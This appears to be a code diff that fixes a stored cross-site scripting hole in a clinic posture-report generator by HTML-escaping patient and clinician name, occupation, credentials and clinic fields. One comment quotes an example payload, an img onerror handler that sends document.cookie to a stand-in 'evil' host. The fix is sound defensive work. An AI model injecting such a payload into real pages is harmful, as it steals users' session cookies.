@@ -6720,6 +6720,21 @@ function PostureAnalysisModule({ activePatient, set: setPatientField, navContext
   );
 
   // ── Report generator ─────────────────────────────────────────────────────────
+  // Patient/clinician name, occupation, credentials and clinic are free-text
+  // fields (patientInfo/clinicianInfo state below) that a real bug bounty
+  // read would flag: buildStaticReport() interpolates them directly into an
+  // HTML string that gets win.document.write()'d into a same-origin popup
+  // window with no sandboxing -- unescaped, a name like
+  // `<img src=x onerror="fetch('//evil/steal?c='+document.cookie)">` would
+  // execute as a real stored XSS the moment that patient's report is
+  // opened/printed. Escaping once here, at the single point these 5 fields
+  // enter the report data object `d`, is safer than trying to remember to
+  // escape every one of the ~11 places they're interpolated inside
+  // buildStaticReport() below.
+  const escHtml = (s) => String(s ?? "").replace(/[&<>"']/g, (c) => ({
+    "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;",
+  }[c]));
+
   function generateReport() {
     // In multi-view mode, use composite data if available; fall back to single-view
     const isMultiRpt = assessMode === "multi" && mvComposite && Object.keys(mvResults||{}).length >= 2;
@@ -6783,17 +6798,17 @@ function PostureAnalysisModule({ activePatient, set: setPatientField, navContext
     const d = {
       analysisMode: isClinicianVerified ? "Clinician Verified" : "AI Estimated",
       patient: {
-        name: patientInfo.name||"Patient",
+        name: escHtml(patientInfo.name||"Patient"),
         age: patientInfo.age||"—",
         sex: patientInfo.sex||"—",
         height: patientHeightCm+"cm",
         weight: "—",
-        occupation: patientInfo.occupation||"—",
+        occupation: escHtml(patientInfo.occupation||"—"),
       },
       clinician: {
-        name: clinicianInfo.name||"Clinician",
-        credentials: clinicianInfo.credentials||"",
-        clinic: clinicianInfo.clinic||"PostureAI Clinic",
+        name: escHtml(clinicianInfo.name||"Clinician"),
+        credentials: escHtml(clinicianInfo.credentials||""),
+        clinic: escHtml(clinicianInfo.clinic||"PostureAI Clinic"),
         date: new Date().toLocaleDateString("en-GB",{day:"numeric",month:"long",year:"numeric"}),
         session: sessions.length+1,
       },
@@ -6844,6 +6859,13 @@ function PostureAnalysisModule({ activePatient, set: setPatientField, navContext
   @media print{body{background:#fff;padding:0}.page{margin:0;box-shadow:none;border-radius:0;page-break-after:always}.page:last-of-type{page-break-after:auto}}
 </style></head><body>${bodyHtml}</body></html>`;
     // Open in new tab and print — same method as the working PdfReportsModal
+    // (Considered adding noopener/noreferrer here as defense-in-depth, but
+    // window.open() with the noopener feature returns null for the handle
+    // in most browsers -- this code needs a live handle to write the report
+    // into, so that would break the feature outright. The escHtml() fix
+    // above, at the one place these fields enter the report data, is the
+    // real fix; this window still trusts its own document.write content by
+    // necessity, same as PdfReportsModal's existing pattern elsewhere.)
     const win = window.open("","_blank");
     if(!win){ alert("Please allow popups to generate the PDF report."); return; }
     win.document.open(); win.document.write(injectViewerControls(fullHtml)); win.document.close();
